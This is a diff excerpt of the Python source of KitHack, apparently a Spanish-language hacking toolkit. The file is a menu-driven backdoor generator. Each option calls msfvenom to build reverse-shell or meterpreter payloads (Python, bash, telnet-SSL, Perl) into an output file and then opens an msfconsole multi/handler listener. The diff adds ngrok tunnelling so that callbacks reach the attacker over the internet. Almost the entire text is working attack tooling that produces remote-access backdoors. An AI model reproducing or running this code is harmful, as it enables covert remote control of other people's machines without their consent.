-			print '{0}[06]{1} python/shell_reverse_udp'.format(WHITE, YELLOW)
+			print '{0}[04]{1} python/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[05]{1} python/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[06]{1} python/shell_reverse_tcp_ssl'.format(WHITE, YELLOW)
+			print '{0}[07]{1} python/shell_reverse_udp'.format(WHITE, YELLOW)
 
 			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
 
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_http LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_http LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_http; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()								
 
 			elif pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_https LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_https LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_https; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()		
 
 			elif pay == 3:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()									
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()								
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()		
 
 			elif pay == 4:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p python/shell_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()				
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()								
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 5:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p python/shell_reverse_tcp_ssl LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p python/shell_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()				
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
-					banner(), menu(), options()		
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
 
 			elif pay == 6:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p python/shell_reverse_udp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p python/shell_reverse_tcp_ssl LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_udp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()		
+
+			elif pay == 7:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p python/shell_reverse_udp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()	
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_udp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_udp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()		
 
 			else:
@@ -2267,56 +3398,68 @@ def options():
 
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_bash LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_bash LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.sh'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.sh".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()						
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_bash; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()						
 
 			elif pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.sh'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.sh".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()		
 
 			else:
@@ -2335,56 +3478,68 @@ def options():
 
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, OUT))																				
